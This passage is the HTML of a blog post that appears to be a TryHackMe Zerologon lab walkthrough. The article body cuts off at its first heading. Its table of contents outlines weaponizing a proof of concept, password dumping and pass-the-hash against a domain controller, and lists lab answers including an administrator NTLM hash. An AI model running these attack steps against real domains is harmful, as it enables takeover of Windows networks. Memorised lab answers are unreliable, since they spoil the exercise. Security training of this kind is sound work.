<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Try Hack ME Room Zerologon &#183; Classroom</title><meta name=title content="Try Hack ME Room Zerologon &#183; Classroom"><meta name=description content="Try Hack ME Room Zerologon walkthrough"><meta name=keywords content="notes,tryhackme,rooms,"><link rel=canonical href=https://classroom.anir0y.in/post/thm-room-zerologon/><meta name=author content="Animesh Roy"><link href=https://twitter.com/anir0y rel=me><link href=https://github.com/anir0y rel=me><meta property="og:url" content="https://classroom.anir0y.in/post/thm-room-zerologon/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="Try Hack ME Room Zerologon"><meta property="og:description" content="Try Hack ME Room Zerologon walkthrough"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-05-10T01:22:37+05:30"><meta property="article:modified_time" content="2021-05-10T01:22:37+05:30"><meta property="article:tag" content="Notes"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Rooms"><meta name=twitter:card content="summary"><meta name=twitter:title content="Try Hack ME Room Zerologon"><meta name=twitter:description content="Try Hack ME Room Zerologon walkthrough"><meta name=twitter:image content="https://classroom.anir0y.in/img/cover.jpg"><meta property="og:image" content="https://classroom.anir0y.in/img/cover.jpg"><link type=text/css rel=stylesheet href=/css/main.bundle.min.2b25fd51aafe5a0a65545bce9bd61a30f10d3e06d3ee7763f9340e7b14b436599753c7638c95d4d05f1c440e6fd97fc28f2f1a2f19130b30f65434ddd920ebe3.css integrity="sha512-KyX9Uar+WgplVFvOm9YaMPENPgbT7ndj+TQOexS0NlmXU8djjJXU0F8cRA5v2X/Cjy8aLxkTCzD2VDTd2SDr4w=="><script type=text/javascript src=/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js integrity="sha512-vdp97ObLrwje730lT3+ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w==" data-copy=Copy data-copied=Copied></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"Try Hack ME Room Zerologon","headline":"Try Hack ME Room Zerologon","description":"Try Hack ME Room Zerologon walkthrough","inLanguage":"en","url":"https://classroom.anir0y.in/post/thm-room-zerologon/","author":{"@type":"Person","name":"Animesh Roy","url":"https:\/\/classroom.anir0y.in\/about/me/"},"publisher":{"@type":"Organization","name":"Classroom","logo":{"@type":"ImageObject","url":"https:\/\/classroom.anir0y.in\/img/avatar.jpeg"}},"image":"https:\/\/classroom.anir0y.in\/img\/thm.png","copyrightYear":"2021","dateCreated":"2021-05-10T01:22:37\u002b05:30","datePublished":"2021-05-10T01:22:37\u002b05:30","dateModified":"2021-05-10T01:22:37\u002b05:30","keywords":["notes","tryhackme","rooms"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://classroom.anir0y.in/post/thm-room-zerologon/"},"wordCount":"3664"},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://classroom.anir0y.in/post/"},{"@type":"ListItem","position":2,"name":"Try Hack ME Room Zerologon","item":"https://classroom.anir0y.in/post/thm-room-zerologon/"}]}]</script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3526678290068011" crossorigin=anonymous></script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class="main-menu flex items-center w-full gap-2 p-1 pl-0"><a href=/ class="text-base font-medium truncate min-w-0 shrink">Classroom</a><div class="flex items-center ms-auto"><div class="hidden md:flex"><nav class="flex items-center gap-x-5 h-12"><a href=/post/ class="flex items-center bf-icon-color-hover" aria-label=Posts title=Posts><span class="text-base font-medium break-normal">Posts
</span></a><a href=/categories/ class="flex items-center bf-icon-color-hover" aria-label=Categories title=Categories><span class="text-base font-medium break-normal">Categories
</span></a><a href=/tags/ class="flex items-center bf-icon-color-hover" aria-label=Tags title=Tags><span class="text-base font-medium break-normal">Tags
</span></a><a href=/archives/ class="flex items-center bf-icon-color-hover" aria-label=Archives title=Archives><span class="text-base font-medium break-normal">Archives
</span></a><a href=/about/me/ class="flex items-center bf-icon-color-hover" aria-label=About title><span class="text-base font-medium break-normal">About
</span></a><button id=search-button aria-label=Search class="text-base bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base bf-icon-color-hover"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav></div><div class="flex md:hidden"><div class="flex items-center h-14 gap-4"><button id=search-button-mobile aria-label=Search class="flex items-center justify-center bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile type=button aria-label="Dark mode switcher" class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400"><div class=dark:hidden><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="hidden dark:block"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button>
<input type=checkbox id=mobile-menu-toggle autocomplete=off class="hidden peer">
<label for=mobile-menu-toggle class="flex items-center justify-center cursor-pointer bf-icon-color-hover"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></label><div role=dialog aria-modal=true style=scrollbar-gutter:stable class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
bf-scrollbar"><label for=mobile-menu-toggle class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></label><nav class="mx-auto max-w-md space-y-6"><div class=px-2><a href=/post/ aria-label=Posts class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Posts class="text-2xl font-bold tracking-tight">Posts</span></a></div><div class=px-2><a href=/categories/ aria-label=Categories class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Categories class="text-2xl font-bold tracking-tight">Categories</span></a></div><div class=px-2><a href=/tags/ aria-label=Tags class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Tags class="text-2xl font-bold tracking-tight">Tags</span></a></div><div class=px-2><a href=/archives/ aria-label=Archives class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Archives class="text-2xl font-bold tracking-tight">Archives</span></a></div><div class=px-2><a href=/about/me/ aria-label=About class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title class="text-2xl font-bold tracking-tight">About</span></a></div></nav></div></div></div></div></div><script>(function(){var t,n,e=document.querySelector(".main-menu");if(!e)return;t=window.location.pathname,n=e.querySelectorAll('a[href="'+t+'"]'),n.forEach(function(e){var t=e.querySelectorAll("span");t.forEach(function(e){e.classList.add("active")})})})()</script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"><img id=background-image src=/img/thm_hu_ac8a16fd71d6b794.png role=presentation loading=eager decoding=async fetchpriority=high class="absolute inset-0 w-full h-full object-cover"><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div><script type=text/javascript src=/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W+5DcKnbOMMOI+f7IvMGNsVvUfj+ooJ13n6EqqcGEz2FKMVvHLGwWPQ==" data-blur-id=background-blur data-image-id=background-image data-image-url=/img/thm_hu_ac8a16fd71d6b794.png></script><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>Classroom</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/post/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/post/thm-room-zerologon/>Try Hack ME Room Zerologon</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Try Hack ME Room Zerologon</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-05-10T01:22:37+05:30>10 May 2021</time><span class="px-2 text-primary-500">&#183;</span><span>3664 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">18 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/classroom/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Classroom
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/categories/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">TryHackMe
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/notes/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Notes
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Tryhackme
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/rooms/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Rooms</span></span></a></div></div><div class="flex author"><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Animesh Roy</div><div class="text-sm text-neutral-700 dark:text-neutral-400">CTF walkthroughs, malware analysis, penetration testing, and security research.</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://twitter.com/anir0y target=_blank aria-label=Twitter title=Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/anir0y target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-10"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#zero-logon---the-zero-day-angle>Zero Logon - The Zero Day Angle</a></li><li><a href=#room-subscription-only>Room Subscription Only</a><ul><li><a href=#about-the-vulnerability-->About The vulnerability -</a></li><li><a href=#about-machine-accounts-->About Machine Accounts -</a></li><li><a href=#abusing-the-vulnerability-->Abusing the Vulnerability -</a></li><li><a href=#analyzing-the-ms-nrpc-logon-process-->Analyzing the MS-NRPC Logon Process -</a></li></ul></li><li><a href=#impacket-installation>Impacket Installation</a></li><li><a href=#modifying-and-weaponizing-the-poc>Modifying and Weaponizing the PoC</a><ul><li><a href=#poc-and-you-->PoC and You -</a></li><li><a href=#analyzing-the-poc-->Analyzing the PoC -</a></li><li><a href=#end-of-transmission-whats-next-->End of Transmission, What&rsquo;s Next? -</a></li><li><a href=#whats-it-all-mean-doc-->What&rsquo;s It All Mean, Doc? -</a></li><li><a href=#level-up>Level up</a></li><li><a href=#answers>Answers</a></li></ul></li><li><a href=#lab-it-up>Lab it UP!</a><ul><li><a href=#nmap-result>Nmap Result</a></li><li><a href=#what-is-the-netbios-name-of-the-domain-controller>What is the NetBIOS name of the Domain Controller?</a><ul><li><a href=#ans-dc01>ANS: DC01</a></li></ul></li><li><a href=#what-is-the-netbios-domain-name-of-the-network>What is the NetBIOS domain name of the network?</a><ul><li><a href=#ans-hololive>ANS: HOLOLIVE</a></li></ul></li><li><a href=#what-domain-are-you-attacking>What domain are you attacking?</a><ul><li><a href=#ans-hololivelocal>ANS: hololive.local</a></li></ul></li><li><a href=#what-is-the-local-administrators-ntlm-hash>What is the Local Administrator&rsquo;s NTLM hash?</a><ul><li><a href=#ans--3f3ef89114fb063e3d7fc23c20f65568>ANS: 3f3ef89114fb063e3d7fc23c20f65568</a></li><li><a href=#activate-venv>Activate Venv</a></li></ul></li><li><a href=#password-dumping>Password dumping:</a></li><li><a href=#how-many-domain-admin-accounts-are-there>How many Domain Admin accounts are there?</a><ul><li><a href=#ans--2>ANS: 2</a></li></ul></li><li><a href=#what-is-the-root-flag>What is the root flag?</a><ul><li><a href=#ans>ANS:</a></li></ul></li><li><a href=#pass-the-hash>Pass the Hash</a><ul><li><a href=#evil-winrm-with-ntlm-hash>Evil-WinRm with NTLM Hash!</a></li></ul></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#zero-logon---the-zero-day-angle>Zero Logon - The Zero Day Angle</a></li><li><a href=#room-subscription-only>Room Subscription Only</a><ul><li><a href=#about-the-vulnerability-->About The vulnerability -</a></li><li><a href=#about-machine-accounts-->About Machine Accounts -</a></li><li><a href=#abusing-the-vulnerability-->Abusing the Vulnerability -</a></li><li><a href=#analyzing-the-ms-nrpc-logon-process-->Analyzing the MS-NRPC Logon Process -</a></li></ul></li><li><a href=#impacket-installation>Impacket Installation</a></li><li><a href=#modifying-and-weaponizing-the-poc>Modifying and Weaponizing the PoC</a><ul><li><a href=#poc-and-you-->PoC and You -</a></li><li><a href=#analyzing-the-poc-->Analyzing the PoC -</a></li><li><a href=#end-of-transmission-whats-next-->End of Transmission, What&rsquo;s Next? -</a></li><li><a href=#whats-it-all-mean-doc-->What&rsquo;s It All Mean, Doc? -</a></li><li><a href=#level-up>Level up</a></li><li><a href=#answers>Answers</a></li></ul></li><li><a href=#lab-it-up>Lab it UP!</a><ul><li><a href=#nmap-result>Nmap Result</a></li><li><a href=#what-is-the-netbios-name-of-the-domain-controller>What is the NetBIOS name of the Domain Controller?</a><ul><li><a href=#ans-dc01>ANS: DC01</a></li></ul></li><li><a href=#what-is-the-netbios-domain-name-of-the-network>What is the NetBIOS domain name of the network?</a><ul><li><a href=#ans-hololive>ANS: HOLOLIVE</a></li></ul></li><li><a href=#what-domain-are-you-attacking>What domain are you attacking?</a><ul><li><a href=#ans-hololivelocal>ANS: hololive.local</a></li></ul></li><li><a href=#what-is-the-local-administrators-ntlm-hash>What is the Local Administrator&rsquo;s NTLM hash?</a><ul><li><a href=#ans--3f3ef89114fb063e3d7fc23c20f65568>ANS: 3f3ef89114fb063e3d7fc23c20f65568</a></li><li><a href=#activate-venv>Activate Venv</a></li></ul></li><li><a href=#password-dumping>Password dumping:</a></li><li><a href=#how-many-domain-admin-accounts-are-there>How many Domain Admin accounts are there?</a><ul><li><a href=#ans--2>ANS: 2</a></li></ul></li><li><a href=#what-is-the-root-flag>What is the root flag?</a><ul><li><a href=#ans>ANS:</a></li></ul></li><li><a href=#pass-the-hash>Pass the Hash</a><ul><li><a href=#evil-winrm-with-ntlm-hash>Evil-WinRm with NTLM Hash!</a></li></ul></li></ul></li></ul></nav></div></details><script>(function(){"use strict";const s=.33,o="#TableOfContents",i=".anchor",a='a[href^="#"]',r="li ul",c="active";let t=!1;function l(e,n){const o=window.scrollY+window.innerHeight*n,i=[...document.querySelectorAll('#TableOfContents a[href^="#"]')],s=new Set(i.map(e=>e.getAttribute("href").substring(1)));if(t)for(let t=0;t<e.length;t++){const n=e[t];if(!s.has(n.id))continue;const o=n.getBoundingClientRect().top+window.scrollY;if(Math.abs(window.scrollY-o)<100)return n.id}for(let t=e.length-1;t>=0;t--){const n=e[t].getBoundingClientRect().top+window.scrollY;if(n<=o&&s.has(e[t].id))return e[t].id}return e.find(e=>s.has(e.id))?.id||""}function e({toc:e,anchors:t,links:n,scrollOffset:s,collapseInactive:o}){const i=l(t,s);if(!i)return;if(n.forEach(e=>{const t=e.getAttribute("href")===`#${i}`;if(e.classList.toggle(c,t),o){const n=e.closest("li")?.querySelector("ul");n&&(n.style.display=t?"":"none")}}),o){const n=e.querySelector(`a[href="#${CSS.escape(i)}"]`);let t=n;for(;t&&t!==e;)t.tagName==="UL"&&(t.style.display=""),t.tagName==="LI"&&t.querySelector("ul")?.style.setProperty("display",""),t=t.parentElement}}function n(){const n=document.querySelector(o);if(!n)return;const l=!0,u=[...document.querySelectorAll(i)],d=[...n.querySelectorAll(a)];l&&n.querySelectorAll(r).forEach(e=>e.style.display="none"),d.forEach(e=>{e.addEventListener("click",()=>{t=!0})});const c={toc:n,anchors:u,links:d,scrollOffset:s,collapseInactive:l};window.addEventListener("scroll",()=>e(c),{passive:!0}),window.addEventListener("hashchange",()=>e(c),{passive:!0}),e(c)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",n):n()})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="not-prose my-4 print:hidden"><div class=ad-container><ins class=adsbygoogle style=display:block data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188 data-ad-format=auto data-full-width-responsive=true></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div><div class="article-content max-w-prose mb-20"><hr><h2 class="relative group">Zero Logon - The Zero Day Angle<div id=zero-logon---the-zero-day-angle class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#zero-logon---the-zero-day-angle 